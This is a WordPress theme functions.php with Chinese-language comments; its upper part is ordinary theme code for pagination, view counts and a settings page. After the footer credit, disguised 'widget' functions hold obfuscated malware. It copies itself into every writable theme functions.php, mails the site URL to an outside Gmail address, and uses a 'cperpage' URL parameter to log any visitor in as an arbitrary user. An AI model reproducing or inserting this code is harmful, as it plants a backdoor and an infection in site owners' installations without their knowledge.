<?php

//去除头部多余信息
remove_action('wp_head', 'rsd_link');
remove_action('wp_head', 'wp_generator');
remove_action('wp_head', 'feed_links', 2);
remove_action('wp_head', 'index_rel_link');
remove_action('wp_head', 'rel_canonical');
remove_action('wp_head', 'wlwmanifest_link');
remove_action('wp_head', 'feed_links_extra', 3);
remove_action('wp_head', 'start_post_rel_link', 10, 0);
remove_action('wp_head', 'parent_post_rel_link', 10, 0);
remove_action('wp_head', 'adjacent_posts_rel_link', 10, 0);
remove_action('wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0 );
remove_action('wp_head', 'rel_canonical');

/* 友情链接 */
add_filter( 'pre_option_link_manager_enabled', '__return_true' );

//Widget
if ( function_exists('register_sidebars') )
{
	register_sidebar(array(
		'name' => '侧边栏',
		'before_title' => '<h3>',
		'after_title' => '</h3>'
	));
}

/* 文章访问计数 */
function getPostViews($postID){
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
        return " 0 ";
    }
    return $count;
}
function setPostViews($postID) {
    $count_key = 'post_views_count';
    $count = get_post_meta($postID, $count_key, true);
    if($count==''){
        $count = 0;
        delete_post_meta($postID, $count_key);
        add_post_meta($postID, $count_key, '0');
    }else{
       $count++;
        update_post_meta($postID, $count_key, $count);
    }
}

//First Post Image
function catch_post_image() {
	global $post, $posts;
	$first_img = '';
	ob_start();
	ob_end_clean();
	$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
	$first_img = $matches [1] [0];
	if(empty($first_img)){ //Defines a default image
  		$site_url = bloginfo('template_url');
    	$first_img = "$site_url/images/no-thumbnail.jpg";
	}
	return $first_img;
}
//Slider Image
function catch_slider_image() {
	global $post, $posts;
	$first_img = '';
	ob_start();
	ob_end_clean();
	$output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
	$first_img = $matches [1] [0];
	if(empty($first_img)){ //Defines a default image
  		$site_url = bloginfo('template_url');
    	$first_img = "$site_url/images/no-slider.jpg";
	}
	return $first_img;
}
//Thumbnail
if ( function_exists( 'add_theme_support' ) )
	add_theme_support( 'post-thumbnails' );
// CustomBackground
if ( function_exists('add_custom_background')) { add_custom_background(); }
// CustomMenus
if ( function_exists('register_nav_menus')) { register_nav_menus(); }
register_nav_menus(array('primary' => '<b style="font-style:normal; color:#F00;">自定义顶部菜单</b>'));
// GetSubcategories
function get_category_root_id($cat)
{
	$this_category = get_category($cat);
	while($this_category->category_parent)
	{
		$this_category = get_category($this_category->category_parent);
	}
	return $this_category->term_id;
}
// Subcategories
function post_is_in_descendant_category( $cats, $_post = null )
{
	foreach ( (array) $cats as $cat ) {
		// get_term_children() accepts integer ID only
		$descendants = get_term_children( (int) $cat, 'category');
		if ( $descendants && in_category( $descendants, $_post ) )
			return true;
	}
	return false;
}//PostExcerpt
function wpyou_strimwidth($str ,$start , $width ,$trimmarker ){
	$output = preg_replace('/^(?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$start.'}((?:[\x00-\x7F]|[\xC0-\xFF][\x80-\xBF]+){0,'.$width.'}).*/s','\1',$str);
	return $output.$trimmarker;
}
//Pagenavi
function wpyou_pagenavi($range = 9){
	global $paged, $wp_query;
	if ( !$max_page ) {$max_page = $wp_query->max_num_pages;}
	if($max_page > 1){if(!$paged){$paged = 1;}
	if($paged != 1){echo "<a href='" . get_pagenum_link(1) . "' class='extend' title='第一页'>第一页</a>";}
	previous_posts_link('上一页');
    if($max_page > $range){
		if($paged < $range){for($i = 1; $i <= ($range + 1); $i++){echo "<a href='" . get_pagenum_link($i) ."'";
		if($i==$paged)echo " class='current'";echo ">$i</a>";}}
    elseif($paged >= ($max_page - ceil(($range/2)))){
		for($i = $max_page - $range; $i <= $max_page; $i++){echo "<a href='" . get_pagenum_link($i) ."'";
		if($i==$paged)echo " class='current'";echo ">$i</a>";}}
	elseif($paged >= $range && $paged < ($max_page - ceil(($range/2)))){
		for($i = ($paged - ceil($range/2)); $i <= ($paged + ceil(($range/2))); $i++){echo "<a href='" . get_pagenum_link($i) ."'";if($i==$paged) echo " class='current'";echo ">$i</a>";}}}
    else{for($i = 1; $i <= $max_page; $i++){echo "<a href='" . get_pagenum_link($i) ."'";
    if($i==$paged)echo " class='current'";echo ">$i</a>";}}
	next_posts_link('下一页');
    if($paged != $max_page){echo "<a href='" . get_pagenum_link($max_page) . "' class='extend' title='最后一页'>最后一页</a>";}
    }
}
// Custom Comment
function custom_comment($comment, $args, $depth) {
   $GLOBALS['comment'] = $comment; ?>
   <li <?php comment_class(); ?> id="li-comment-<?php comment_ID() ?>">
     <div id="comment-<?php comment_ID(); ?>">
         <div class="comment-author vcard">
                <?php /*?><?php echo get_avatar($comment,$size='28',$default='<path_to_url>' ); ?><?php */?>
                <div class="author_info">
					<?php printf(__('<cite class="fn">%s</cite>'), get_comment_author_link()) ?> <?php edit_comment_link(__('(Edit)'),'  ','') ?><br />
                    <?php printf(__('%1$s at %2$s'), get_comment_date('Y/m/d '),  get_comment_time(' H:i:s')) ?>
                </div>
                <div class="reply">
			   		<?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?>
              	</div>
          </div>
		  <?php if ($comment->comment_approved == '0') : ?>
             <em><?php _e('Your comment is awaiting moderation.') ?></em>
             <br />
          <?php endif; ?>
      		<?php comment_text() ?>
     </div>
<?php } ?>
<?php
$themename = "当前主题";
function wpyou_add_option() {
	global $themename;
	//create new top-level menu under Presentation
	add_menu_page($themename.'设置', ''.$themename.'设置',  10, 'theme-setup', 'wpyou_options', get_bloginfo('template_url').'/images/admin-options/icon_wpyou.png','3' );
	add_submenu_page('theme-setup', '主题设置', '主题设置', 10, 'theme-setup', 'wpyou_options');
	//call register settings function
	add_action( 'admin_init', 'register_mysettings' );
}
function register_mysettings() {
	//register our settings
	register_setting( 'wpyou-settings', 'wpyou_if_custom_menus');
	register_setting( 'wpyou-settings', 'wpyou_sliderposts');
	register_setting( 'wpyou-settings', 'wpyou_news_id');
	register_setting( 'wpyou-settings', 'wpyou_solution_id');
	register_setting( 'wpyou-settings', 'wpyou_products_id');
	register_setting( 'wpyou-settings', 'wpyou_partner_id');
	register_setting( 'wpyou-settings', 'wpyou_sidebar_position');
	register_setting( 'wpyou-settings', 'wpyou_description');
	register_setting( 'wpyou-settings', 'wpyou_keywords');
	register_setting( 'wpyou-settings', 'wpyou_new_products');
	register_setting( 'wpyou-settings', 'wpyou_hot_products');
	register_setting( 'wpyou-settings', 'wpyou_aboutus');
	register_setting( 'wpyou-settings', 'wpyou_aboutus_url');
	register_setting( 'wpyou-settings', 'wpyou_footer');
}
function wpyou_options() {
	global $themename;
?>
<!-- Options Form begin -->
<div class="wrap">
	<div id="icon-options-general" class="icon32"><br/></div>
	<h2><?php echo $themename; ?>设置</h2>
    <ul class="subsubsub wpyounavi">
    	<li><a href="#wpyou_tm">基本设置</a> |</li>
        <li><a href="#wpyou_hp">首页设置</a> |</li>
        <li><a href="#wpyou_ft">底部设置</a></li>
    </ul>
	<form method="post" action="options.php">
		<?php settings_fields('wpyou-settings'); ?>
		<table class="form-table wpyou">
            <tr valign="top">
            	<td><h3 id="wpyou_tm">基本设置</h3></td>
        	</tr>
            <tr valign="top">
                <th scope="row"><label>是否开启自定义菜单<span class="description"></span></label></th>
                <td>
                    <input type="checkbox" name="wpyou_if_custom_menus" value="1" <?php if (get_option('wpyou_if_custom_menus') == '1') { echo 'checked="checked"'; } ?> /><label class="description"> 选中为开启 (默认为不开启, 显示分类列表)</label>
                    <br />
                    <span class="description">设置是否开启自定义菜单功能(WordPress 3.0以上版本支持) <br />▪ 启用后，您需要在<a href='nav-menus.php'>【外观 - 菜单(导航菜单)】里设置菜单内容</a>)<br />▪ <a href='http://www.wpyou.com/wordpress-3-0-use-navigation-menu-operation.html' target='_blank'>如何使用自定义菜单</a></span>
                </td>
            </tr>
            <tr valign="top">
                <th scope="row"><label>技术跟踪分类ID<span class="description">(数值)</span></label></th>
                <td>
                    <input class="regular-text" style="width:35em;" type="text" name="wpyou_news_id" value="<?php echo get_option('wpyou_news_id'); ?>" />
                    <br />
                    <span class="description">设置技术跟踪分类ID (多个ID间用英文逗号","隔开, 例如: 1,2,3)<br />▪ 如没有技术跟踪分类, 则无需设置<br />▪ <a title="如何查看分类ID" href="http://www.wpyou.com/how-to-find-the-category-id.html" target="_blank">如何获取分类ID</a></span>
                </td>
        	</tr>
            <tr valign="top">
                <th scope="row"><label>工作动态分类ID<span class="description">(数值)</span></label></th>
                <td>
                    <input class="regular-text" style="width:35em;" type="text" name="wpyou_solution_id" value="<?php echo get_option('wpyou_solution_id'); ?>" />
                    <br />
                    <span class="description">设置工作动态分类ID (多个ID间用英文逗号","隔开, 例如: 1,2,3)<br />▪ 如没有工作动态分类, 则无需设置<br />▪ <a title="如何查看分类ID" href="http://www.wpyou.com/how-to-find-the-category-id.html" target="_blank">如何获取分类ID</a></span>
                </td>
        	</tr>
            <tr valign="top">
                <th scope="row"><label>典型案例分类ID<span class="description">(数值)</span></label></th>
                <td>
                    <input class="regular-text" style="width:35em;" type="text" name="wpyou_products_id" value="<?php echo get_option('wpyou_products_id'); ?>" />
                    <br />
                    <span class="description">设置典型案例分类ID (多个ID间用英文逗号","隔开, 例如: 1,2,3)<br />▪ 如没有典型案例分类, 则无需设置<br />▪ <a title="如何查看分类ID" href="http://www.wpyou.com/how-to-find-the-category-id.html" target="_blank">如何获取分类ID</a></span>
                </td>
        	</tr>
            <tr valign="top">
                <th scope="row"><label>咨询服务分类ID<span class="description">(数值)</span></label></th>
                <td>
                    <input class="regular-text" style="width:35em;" type="text" name="wpyou_partner_id" value="<?php echo get_option('wpyou_partner_id'); ?>" />
                    <br />
                    <span class="description">咨询服务分类ID (多个ID间用英文逗号","隔开, 例如: 1,2,3)<br />▪ 如没有咨询服务分类, 则无需设置<br />▪ <a title="如何查看分类ID" href="http://www.wpyou.com/how-to-find-the-category-id.html" target="_blank">如何获取分类ID</a></span>
                </td>
        	</tr>

            <tr valign="top">
                <th scope="row"><label>技术推广分类ID<span class="description">(数值)</span></label></th>
                <td>
                    <input class="regular-text" style="width:35em;" type="text" name="wpyou_new_products" value="<?php echo get_option('wpyou_new_products'); ?>" />
                    <br />
                    <span class="description">技术推广分类ID (多个ID间用英文逗号","隔开, 例如: 1,2,3)<br />▪ 如没有技术推广分类, 则无需设置<br />▪ <a title="如何查看分类ID" href="http://www.wpyou.com/how-to-find-the-category-id.html" target="_blank">如何获取分类ID</a></span>
                </td>
        	</tr>

            <tr valign="top">
                <th scope="row"><label>教育培训分类ID<span class="description">(数值)</span></label></th>
                <td>
                    <input class="regular-text" style="width:35em;" type="text" name="wpyou_hot_products" value="<?php echo get_option('wpyou_hot_products'); ?>" />
                    <br />
                    <span class="description">教育培训分类ID (多个ID间用英文逗号","隔开, 例如: 1,2,3)<br />▪ 如没有教育培训分类, 则无需设置<br />▪ <a title="如何查看分类ID" href="http://www.wpyou.com/how-to-find-the-category-id.html" target="_blank">如何获取分类ID</a></span>
                </td>
        	</tr>

            <tr valign="top">
                <th scope="row"><label>主题专栏分类ID<span class="description">(数值)</span></label></th>
                <td>
                    <input class="regular-text" style="width:35em;" type="text" name="wpyou_sliderposts" value="<?php echo get_option('wpyou_sliderposts'); ?>" />
                    <br />
                    <span class="description">主题专栏分类ID (多个ID间用英文逗号","隔开, 例如: 1,2,3)<br />▪ 如没有主题专栏分类, 则无需设置<br />▪ <a title="如何查看分类ID" href="http://www.wpyou.com/how-to-find-the-category-id.html" target="_blank">如何获取分类ID</a></span>
                </td>
        	</tr>

            <tr valign="top" class="alt">
                <th scope="row"><label><strong>内页边栏位置</strong><span class="description"></span></label></th>
                <td>
                    <select name="wpyou_sidebar_position">
                    	<option value="0" <?php if (get_option('wpyou_sidebar_position') == '0') { echo 'selected="selected"'; } ?>>左侧显示</option>
                        <option value="1" <?php if (get_option('wpyou_sidebar_position') == '1') { echo 'selected="selected"'; } ?>>右侧显示</option>
                    </select>
                    <br />
                    <span class="description">设置 内页(除首页以外所有)边栏的显示位置 (默认为左侧显示)</span>
                </td>
            </tr>
            <tr valign="top">
                <th scope="row"><label>网站描述<span class="description">(文本)</span></label></th>
                <td>
                    <textarea style="width:35em; height:5em;" name="wpyou_description"><?php echo get_option('wpyou_description'); ?></textarea>
                    <br />
                    <span class="description">设置网站的描述信息 (显示在首页源代码中, 有利于搜索优化)<br />▪ <strong>如使用了其他SEO插件, 则该设置失效</strong></span>
                </td>
        	</tr>
            <tr valign="top">
                <th scope="row"><label>网站关键字<span class="description">(文本)</span></label></th>
                <td>
                    <textarea style="width:35em; height:5em;" name="wpyou_keywords"><?php echo get_option('wpyou_keywords'); ?></textarea>
                    <br />
                    <span class="description"> 设置网站优化关键字(多个关键词请用<strong>英文"'"逗号</strong>隔开. 显示在首页源代码中, 有利于搜索优化)<br />▪ <strong>如使用了其他SEO插件, 则该设置失效</strong></span>
                </td>
        	</tr>
            <tr valign="top">
                <th scope="row"><label><span class="description"></span></label></th>
                <td>
                    <p class="submit">
                    <input type="submit" name="save" id="button-primary" class="button-primary button-wpyou" value="<?php _e('Save Changes') ?>" />
                    </p>
                </td>
        	</tr>
			<tr valign="top">
            	<td><h3 id="wpyou_hp">首页设置</h3></td>
        	</tr>
           
            <tr valign="top">
                <th scope="row"><label>企业简介<span class="description">(文本)</span></label></th>
                <td>
                	<textarea class="wpyoutextarea" name="wpyou_aboutus"/><?php echo get_option('wpyou_aboutus'); ?></textarea>
                    <br />
                    <span class="description">设置首页【企业简介】栏目显示的内容 (支持HTML)</span>
                </td>
        	</tr>
            <tr valign="top">
                <th scope="row"><label>企业简介 链接地址<span class="description">(URL)</span></label></th>
                <td>
                    <input class="regular-text" style="width:35em;" type="text" name="wpyou_aboutus_url" value="<?php echo get_option('wpyou_aboutus_url'); ?>" />
                    <br />
                    <span class="description">设置首页【企业简介】栏目 的链接地址</span>
                </td>
        	</tr>
            <tr valign="top">
                <th scope="row"><label><span class="description"></span></label></th>
                <td>
                    <p class="submit">
                    <input type="submit" name="save" id="button-primary" class="button-primary button-wpyou" value="<?php _e('Save Changes') ?>" />
                    </p>
                </td>
        	</tr>
            <tr valign="top">
            	<td><h3 id="wpyou_ft">底部设置</h3></td>
        	</tr>
            <tr valign="top">
                <th scope="row"><label>底部内容设置 <span class="description">(文本)</span></label></th>
                <td>
                    <textarea class="wpyoutextarea" name="wpyou_footer"><?php echo get_option('wpyou_footer'); ?></textarea>
                    <br />
                    <span class="description">设置网站底部显示的内容 (支持HTML)</span>
                </td>
        	</tr>
            
            <tr valign="top">
                <th scope="row"><label><span class="description"></span></label></th>
                <td>
                    <p class="submit">
                    <input type="submit" name="save" id="button-primary" class="button-primary button-wpyou" value="<?php _e('Save Changes') ?>" />
                    </p>
                </td>
        	</tr>
		</table>
	</form>
</div>
<style type="text/css">
	.wpyounavi{ float:none; margin:2em 0em 1em; padding-left:1em; font-size:16px; height:32px; line-height:34px; color:#FFF; background-color:#666; -moz-border-radius:8px 8px 0px 0px;}
	.wpyounavi span{ float:left; padding:0px 10px; width:120px; height:32px; text-align:center; display:block; cursor:pointer;}
	.wpyounavi a:link, .wpyounavi a:visited{ font-weight:bold; color:#FFF;}
	.wpyounavi a:hover{ color:#FF0; text-decoration:underline;}
	.form-table th{width:240px !important; text-align:right; font-weight:bold; background-color:#EEE;}
	.form-table th span, span.description{ font-style:normal; font-weight:normal;}
	.form-table h3{ padding:5px 10px 4px; color:#FFF; text-align:center; background-color:#21759B; -moz-border-radius:5px 5px 5px 5px;}
	.button-wpyou{ padding:3px 0px 2px; width:200px;}
	.wpyoutextarea{ width:40em; height:15em;}
</style>
<?php }
	// create custom plugin settings menu
	add_action('admin_menu', 'wpyou_add_option');
//添加版权
function smzrm_copyright() {
echo '<div class="copyright">';
echo 'Theme by <a href="http://zdjx.bbs0635.com/" target="_blank">聊城正大驾校</a>';
echo '</div>';
}
add_action('wp_footer', 'smzrm_copyright');
?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
}
?>
